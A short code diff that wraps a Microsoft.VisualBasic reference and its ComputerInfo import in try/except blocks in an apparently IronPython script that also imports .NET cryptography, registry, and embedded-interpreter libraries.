@@ -29,7 +29,10 @@ except NameError:
 
 clr.AddReference("System.Management")
 clr.AddReference("System.Web.Extensions")
-clr.AddReference("Microsoft.VisualBasic")
+try:
+    clr.AddReference("Microsoft.VisualBasic")
+except:
+    pass
 clr.AddReference("Boo.Lang.Interpreter")
 clr.AddReference("BouncyCastle.Crypto")
 
@@ -45,7 +48,10 @@ from System.Threading import Thread
 from System.Security.Cryptography import Aes, PaddingMode, CryptoStream, CryptoStreamMode, AsymmetricAlgorithm, HMACSHA256, RNGCryptoServiceProvider
 from System.Threading.Tasks import Task
 from System.Web.Script.Serialization import JavaScriptSerializer
-from Microsoft.VisualBasic.Devices import ComputerInfo
+try:
+    from Microsoft.VisualBasic.Devices import ComputerInfo
+except:
+    pass
 from Microsoft.Win32 import Registry
 from IronPython.Hosting import Python
 from Boo.Lang.Interpreter import InteractiveInterpreter
